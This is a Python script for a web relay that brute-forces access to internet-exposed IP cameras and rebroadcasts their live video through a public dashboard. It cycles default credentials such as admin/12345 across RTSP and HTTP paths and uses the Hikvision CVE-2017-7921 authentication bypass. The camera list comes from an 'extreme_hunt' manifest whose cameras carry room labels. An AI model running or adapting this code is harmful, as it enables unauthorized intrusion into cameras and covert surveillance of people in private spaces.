#!/usr/bin/env python3
"""
MJPEG Stream Relay v2 -- port 9094
Multi-method camera access: tries RTSP, HTTP snapshot loop, CVE bypass.
Falls back through all known creds/paths until something works.

  /               -> live grid with all cameras
  /watch/<ip>     -> full-screen live player (auto-reconnects)
  /stream/<ip>    -> raw MJPEG (multipart/x-mixed-replace)
  /thumb/<ip>     -> latest single JPEG
  /probe/<ip>     -> test camera and return status JSON  
  /status         -> JSON status of all streams
"""

import os, json, subprocess, threading, time, signal, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

MANIFEST   = os.path.join(os.path.dirname(__file__), "extreme_hunt/results/manifest.json")
PORT       = 9094
PUBLIC_IP  = "51.68.33.34"
FFMPEG_BIN = "ffmpeg"
PROBE_TIMEOUT = 5
STREAM_FPS    = 3

CREDS = [
    ("", ""),
    ("admin", "12345"),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "1111"),
    ("admin", "password"),
    ("admin", "1234"),
    ("root", ""),
    ("root", "pass"),
    ("root", "1234"),
    ("root", "root"),
]

RTSP_PATHS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/1",
    "/cam/realmonitor?channel=1&subtype=0",
    "/h264/ch1/main/av_stream",
    "/stream1",
    "/live",
    "/onvif1",
    "/1/1",
    "/video1",
    "/11",
    "/h264Preview_01_main",
    "/Streaming/Channels/201",
    "/axis-media/media.amp",
    "/videoMain",
]

RTSP_PORTS = [554, 8554, 5554, 10554]

HTTP_SNAP_PATHS = [
    "/ISAPI/Streaming/channels/101/picture?auth=YWRtaW46MTEK",
    "/ISAPI/Streaming/channels/1/picture?auth=YWRtaW46MTEK",
    "/onvif-http/snapshot?auth=YWRtaW46MTEK",
    "/ISAPI/Streaming/channels/101/picture",
    "/cgi-bin/snapshot.cgi",
    "/snap.jpg",
    "/snapshot.jpg",
    "/image.jpg",
    "/tmpfs/auto.jpg",
    "/webcapture.jpg",
    "/onvif/snapshot",
    "/shot.jpg",
    "/cgi-bin/snapshot.cgi?channel=0",
    "/cgi-bin/api.cgi?cmd=Snap&channel=0",
    "/jpeg/1/image.jpg",
]

HTTP_PORTS = [80, 8080, 8000, 8200, 443, 8001, 8081]

_streams = {}
_streams_lock = threading.Lock()
_working_urls = {}
_working_lock = threading.Lock()


def load_manifest():
    try:
        return json.load(open(MANIFEST)).get("cameras", [])
    except:
        return []


def get_cam_info(ip):
    for c in load_manifest():
        if c.get("ip") == ip:
            return c
    return None


def _ffmpeg_grab_frame(url, timeout=PROBE_TIMEOUT):
    cmd = [FFMPEG_BIN, "-nostdin", "-loglevel", "error"]
    if url.startswith("rtsp://"):
        cmd += ["-rtsp_transport", "tcp"]
    cmd += ["-i", url, "-vframes", "1", "-f", "image2", "pipe:1"]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        if r.returncode == 0 and len(r.stdout) > 3000:
            return r.stdout
    except:
        pass
    return None


def probe_camera(ip):
    with _working_lock:
        cached = _working_urls.get(ip)
    if cached:
        frame = _ffmpeg_grab_frame(cached, timeout=4)
        if frame:
            return cached
        with _working_lock:
            _working_urls.pop(ip, None)

    cam = get_cam_info(ip)
    if cam:
        for rtsp in (cam.get("rtsp_urls") or []):
            frame = _ffmpeg_grab_frame(rtsp, timeout=4)
            if frame:
                with _working_lock:
                    _working_urls[ip] = rtsp
                return rtsp

    for port in HTTP_PORTS[:4]:
        for path in HTTP_SNAP_PATHS[:6]:
            for user, pwd in CREDS[:4]:
                auth = f"{user}:{pwd}@" if user else ""
                url = f"http://{auth}{ip}:{port}{path}"
                frame = _ffmpeg_grab_frame(url, timeout=3)
                if frame:
                    with _working_lock:
                        _working_urls[ip] = url
                    return url

    for port in RTSP_PORTS[:2]:
        for user, pwd in CREDS[:6]:
            auth = f"{user}:{pwd}@" if user else ""
            for path in RTSP_PATHS[:6]:
                url = f"rtsp://{auth}{ip}:{port}{path}"
                frame = _ffmpeg_grab_frame(url, timeout=4)
                if frame:
                    with _working_lock:
                        _working_urls[ip] = url
                    return url

    return None


class StreamPuller:
    def __init__(self, ip, url):
        self.ip = ip
        self.url = url
        self.frame = b""
        self.lock = threading.Lock()
        self.subscribers = []
        self.subs_lock = threading.Lock()
        self.running = True
        self.started = time.time()
        self.frame_count = 0
        self.proc = None
        self._thread = threading.Thread(target=self._pull, daemon=True)
        self._thread.start()

    def _pull(self):
        cmd = [FFMPEG_BIN, "-nostdin", "-loglevel", "quiet"]
        if self.url.startswith("rtsp://"):
            cmd += ["-rtsp_transport", "tcp"]
        cmd += ["-i", self.url, "-f", "image2pipe", "-vcodec", "mjpeg",
                "-r", str(STREAM_FPS), "-q:v", "5", "pipe:1"]
        retries = 0
        while self.running and retries < 3:
            try:
                self.proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                buf = b""
                while self.running:
                    chunk = self.proc.stdout.read(8192)
                    if not chunk:
                        break
                    buf += chunk
                    while True:
                        soi = buf.find(b"\xff\xd8")
                        eoi = buf.find(b"\xff\xd9", soi + 2) if soi != -1 else -1
                        if soi == -1 or eoi == -1:
                            break
                        frame = buf[soi:eoi + 2]
                        buf = buf[eoi + 2:]
                        with self.lock:
                            self.frame = frame
                            self.frame_count += 1
                        with self.subs_lock:
                            for q in list(self.subscribers):
                                try:
                                    while len(q) > 2:
                                        q.pop(0)
                                    q.append(frame)
                                except:
                                    pass
            except:
                pass
            finally:
                if self.proc:
                    try: self.proc.kill()
                    except: pass
            retries += 1
            if self.running:
                time.sleep(2)
        self.running = False

    def subscribe(self):
        q = []
        with self.subs_lock:
            self.subscribers.append(q)
        return q

    def unsubscribe(self, q):
        with self.subs_lock:
            try: self.subscribers.remove(q)
            except: pass

    def stop(self):
        self.running = False
        if self.proc:
            try: self.proc.kill()
            except: pass


def get_or_start_stream(ip):
    with _streams_lock:
        if ip in _streams:
            sp = _streams[ip]
            if sp.running:
                return sp
            else:
                del _streams[ip]
    url = probe_camera(ip)
    if not url:
        return None
    with _streams_lock:
        if ip in _streams and _streams[ip].running:
            return _streams[ip]
        sp = StreamPuller(ip, url)
        _streams[ip] = sp
        return sp


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


class RelayHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def log_error(self, *a): pass

    def _h(self, code, ctype, extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-cache, no-store")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path.rstrip("/")
        try:
            if p == "" or p == "/":
                self._index()
            elif p.startswith("/stream/"):
                self._mjpeg(p[8:])
            elif p.startswith("/watch/"):
                self._watch(p[7:])
            elif p.startswith("/thumb/"):
                self._thumb(p[7:])
            elif p.startswith("/probe/"):
                self._probe(p[7:])
            elif p == "/status":
                self._status()
            else:
                self._h(404, "text/plain")
                self.wfile.write(b"Not found")
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _mjpeg(self, ip):
        sp = get_or_start_stream(ip)
        if not sp:
            self._h(200, "text/html")
            self.wfile.write(b"<html><body style='background:#000;color:#f66;font:2rem monospace;display:flex;align-items:center;justify-content:center;height:100vh'>Camera offline - all probe methods failed</body></html>")
            return
        self._h(200, "multipart/x-mixed-replace; boundary=frame")
        q = sp.subscribe()
        try:
            empty = 0
            while True:
                if q:
                    frame = q.pop(0)
                    empty = 0
                    self.wfile.write(
                        b"--frame\r\nContent-Type: image/jpeg\r\n"
                        b"Content-Length: " + str(len(frame)).encode() + b"\r\n\r\n"
                        + frame + b"\r\n"
                    )
                    self.wfile.flush()
                else:
                    empty += 1
                    if empty > 200:
                        break
                    time.sleep(0.1)
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            sp.unsubscribe(q)

    def _thumb(self, ip):
        with _streams_lock:
            sp = _streams.get(ip)
        if sp and sp.running:
            with sp.lock:
                if sp.frame:
                    self._h(200, "image/jpeg")
                    self.wfile.write(sp.frame)
                    return
        url = probe_camera(ip)
        if url:
            frame = _ffmpeg_grab_frame(url, timeout=5)
            if frame:
                self._h(200, "image/jpeg")
                self.wfile.write(frame)
                return
        self._h(504, "text/plain")
        self.wfile.write(b"Camera not responding")

    def _probe(self, ip):
        url = probe_camera(ip)
        r = {"ip": ip, "alive": url is not None, "url": url or ""}
        self._h(200, "application/json")
        self.wfile.write(json.dumps(r).encode())

    def _status(self):
        with _streams_lock:
            info = {ip: {"running": sp.running, "frames": sp.frame_count,
                         "url": sp.url, "uptime": int(time.time() - sp.started)}
                    for ip, sp in _streams.items()}
        self._h(200, "application/json")
        self.wfile.write(json.dumps(info, indent=2).encode())

    def _watch(self, ip):
        cam = get_cam_info(ip) or {}
        label = cam.get("room_label", "Camera")
        objs = cam.get("objects", "")
        rtsp = (cam.get("rtsp_urls") or [""])[0]
        with _working_lock:
            working = _working_urls.get(ip, rtsp)

        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n'
        html += f'<title>{label} - {ip}</title>\n'
        html += """<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#ddd;font-family:'Courier New',monospace;height:100vh;display:flex;flex-direction:column}
#hdr{background:#111;padding:10px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #333}
#hdr h1{font-size:1rem;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.pill{background:#1a1a2e;border:1px solid #333;padding:3px 10px;border-radius:16px;font-size:.78rem;color:#aaa}
#main{flex:1;display:flex;align-items:center;justify-content:center;background:#000;position:relative}
#vid{max-width:100%;max-height:100%;display:none}
#loading{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px;color:#888}
.spinner{width:40px;height:40px;border:3px solid #333;border-top-color:#4af;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#error{display:none;position:absolute;inset:0;align-items:center;justify-content:center;flex-direction:column;gap:10px;color:#f66}
#ctl{background:#111;padding:8px 14px;display:flex;gap:8px;border-top:1px solid #333;flex-wrap:wrap;align-items:center}
button,a.btn{background:#1a1a2e;border:1px solid #444;color:#ddd;padding:5px 12px;border-radius:5px;cursor:pointer;font-size:.8rem;text-decoration:none;font-family:inherit}
button:hover,a.btn:hover{background:#2a2a4e}
#rtspbox{background:#000;border:1px solid #333;color:#4af;padding:5px 8px;border-radius:5px;font-size:.75rem;flex:1;min-width:200px}
#status{margin-left:auto;font-size:.72rem}
.live{color:#4f4}.dead{color:#f44}.connecting{color:#fa4}
</style>
</head>
<body>
"""
        html += f'<div id="hdr"><h1>{label} &middot; <span style="color:#4af">{ip}</span></h1>'
        html += f'<span class="pill">{objs}</span>'
        html += '<a href="/" class="pill" style="color:#4af;text-decoration:none">&#9664; All</a></div>\n'
        html += '<div id="main"><img id="vid">'
        html += '<div id="loading"><div class="spinner"></div><span>Probing camera...</span>'
        html += '<span style="font-size:.7rem;color:#555">Trying RTSP + HTTP snapshot + CVE bypass</span></div>'
        html += '<div id="error"><span style="font-size:1.5rem">&#9888;</span><span>Camera offline</span>'
        html += '<button onclick="retry()">Retry</button></div></div>\n'
        html += '<div id="ctl">'
        html += '<button onclick="retry()">&#8635; Reload</button>'
        html += f'<button onclick="window.open(\'/stream/{ip}\',\'_blank\')">Raw MJPEG</button>'
        html += '<button onclick="copyUrl()">Copy URL</button>'
        html += f'<input id="rtspbox" type="text" value="{working}" readonly onclick="this.select()">'
        html += '<span id="status" class="connecting">&#9679; connecting</span>'
        html += '</div>\n'
        html += '<script>\n'
        html += 'var vid=document.getElementById("vid"),loading=document.getElementById("loading"),'
        html += 'error=document.getElementById("error"),status=document.getElementById("status"),attempts=0;\n'
        html += f'function startStream(){{vid.style.display="none";loading.style.display="flex";error.style.display="none";'
        html += f'status.className="connecting";status.textContent="connecting...";'
        html += f'vid.src="/stream/{ip}?t="+Date.now();}}\n'
        html += 'vid.onload=function(){vid.style.display="block";loading.style.display="none";error.style.display="none";'
        html += 'status.className="live";status.textContent="LIVE";attempts=0;};\n'
        html += 'vid.onerror=function(){attempts++;if(attempts<3){status.textContent="retry "+attempts+"/3...";'
        html += 'setTimeout(startStream,2000);}else{vid.style.display="none";loading.style.display="none";'
        html += 'error.style.display="flex";status.className="dead";status.textContent="offline";}};\n'
        html += 'function retry(){attempts=0;startStream();}\n'
        html += 'function copyUrl(){var u=document.getElementById("rtspbox").value;'
        html += 'navigator.clipboard.writeText(u).then(function(){alert("Copied: "+u)}).catch(function(){'
        html += 'document.getElementById("rtspbox").select();document.execCommand("copy");alert("Copied!");});}\n'
        html += 'setInterval(function(){if(status.className==="dead")retry();},30000);\n'
        html += 'startStream();\n</script>\n</body>\n</html>'

        self._h(200, "text/html; charset=utf-8")
        self.wfile.write(html.encode())

    def _index(self):
        cams = load_manifest()
        with _working_lock:
            working_ips = set(_working_urls.keys())

        cards = ""
        for c in cams:
            ip = c.get("ip", "")
            label = c.get("room_label", "Room")
            objs = c.get("objects", "")
            shot_path = c.get("screenshot_url", "")
            shot_url = f"http://{PUBLIC_IP}:9093/{shot_path}" if shot_path else ""
            dot = "color:#4f4" if ip in working_ips else "color:#666"
            cards += f'''
<div class="card" onclick="window.open('/watch/{ip}','_blank')">
  <div class="tw">
    <img src="{shot_url}" loading="lazy"
         onerror="this.style.background='#111';this.alt='No image'">
    <div class="ob">{label}</div>
  </div>
  <div class="info">
    <div class="ip"><span style="{dot}">&#11044;</span> {ip}</div>
    <div class="objs">{objs}</div>
    <div class="btns">
      <a href="/watch/{ip}" target="_blank" class="bw" onclick="event.stopPropagation()">Watch</a>
      <a href="/stream/{ip}" target="_blank" class="bs" onclick="event.stopPropagation()">MJPEG</a>
      <a href="/probe/{ip}" target="_blank" class="bp" onclick="event.stopPropagation()">Probe</a>
    </div>
  </div>
</div>'''

        html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>TITAN-X Live Relay - {len(cams)} cameras</title>
<meta http-equiv="refresh" content="20">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#090909;color:#ddd;font-family:'Courier New',monospace;padding:14px}}
h1{{font-size:1.2rem;color:#4af;margin-bottom:4px}}
.sub{{color:#666;font-size:.78rem;margin-bottom:14px}}
.sub a{{color:#4af}}
.grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px}}
.card{{background:#111;border:1px solid #222;border-radius:8px;overflow:hidden;cursor:pointer;transition:border-color .2s}}
.card:hover{{border-color:#4af}}
.tw{{position:relative}}
.tw img{{width:100%;height:150px;object-fit:cover;display:block;background:#0a0a0a}}
.ob{{position:absolute;top:6px;left:6px;background:#000b;padding:2px 8px;border-radius:4px;font-size:.72rem;color:#fff}}
.info{{padding:8px}}
.ip{{font-size:.78rem;color:#4af;margin-bottom:3px}}
.objs{{font-size:.7rem;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:5px}}
.btns{{display:flex;gap:5px}}
.bw,.bs,.bp{{padding:3px 8px;border-radius:4px;font-size:.7rem;text-decoration:none;color:#fff;font-family:inherit}}
.bw{{background:#1a6a2a}}.bw:hover{{background:#2a8a3a}}
.bs{{background:#1a3a6a;color:#aaf}}.bs:hover{{background:#2a4a8a}}
.bp{{background:#3a2a1a;color:#fa8}}.bp:hover{{background:#5a3a1a}}
</style>
</head>
<body>
<h1>TITAN-X Live Relay - {len(cams)} cameras</h1>
<div class="sub">Port {PORT} | Click camera to watch | Auto-probes RTSP + HTTP + CVE-2017-7921 |
<a href="http://{PUBLIC_IP}:9093/screenshot_selector.html">Selector</a></div>
<div class="grid">{cards}</div>
</body>
</html>'''
        self._h(200, "text/html; charset=utf-8")
        self.wfile.write(html.encode())


def main():
    signal.signal(signal.SIGTERM, lambda *_: os._exit(0))
    signal.signal(signal.SIGINT, lambda *_: os._exit(0))
    srv = ThreadedHTTPServer(("0.0.0.0", PORT), RelayHandler)
    print(f"[relay] MJPEG stream relay v2 on port {PORT}")
    print(f"[relay] http://{PUBLIC_IP}:{PORT}/")
    srv.serve_forever()


if __name__ == "__main__":
    main()
